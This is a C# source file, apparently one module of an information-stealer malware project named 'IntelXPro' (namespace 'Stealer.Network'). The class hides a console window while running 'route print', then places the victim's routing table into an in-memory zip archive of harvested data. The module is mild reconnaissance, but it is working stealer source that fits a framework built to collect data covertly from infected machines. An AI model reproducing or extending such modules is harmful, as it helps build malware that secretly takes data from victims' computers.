using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.Diagnostics;
using System.Text;

namespace IntelXPro.src.IntelXPro.Stealer.Network
{
    internal class RoutingTable : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var networkApp = new Counter.CounterApplications { Name = "Routing Table" };
                StringBuilder sb = new StringBuilder();
                
                sb.AppendLine("[Routing Table]");
                sb.AppendLine($"Collected at: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                sb.AppendLine();
                
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "route";
                    process.StartInfo.Arguments = "print";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    sb.AppendLine(output);
                }
                
                string targetPath = "Network\\routing_table.txt";
                zip.AddTextFile(targetPath, sb.ToString());
                networkApp.Files.Add(targetPath);
                
                if (networkApp.Files.Count > 0)
                {
                    counter.Applications.Add(networkApp);
                }
            }
            catch (Exception ex)
            {
                var networkApp = new Counter.CounterApplications { Name = "Routing Table" };
                StringBuilder errorSb = new StringBuilder();
                errorSb.AppendLine("[Routing Table]");
                errorSb.AppendLine($"Error collecting routing table: {ex.Message}");
                
                string targetPath = "Network\\routing_table.txt";
                zip.AddTextFile(targetPath, errorSb.ToString());
                networkApp.Files.Add(targetPath);
                counter.Applications.Add(networkApp);
            }
        }
    }
}
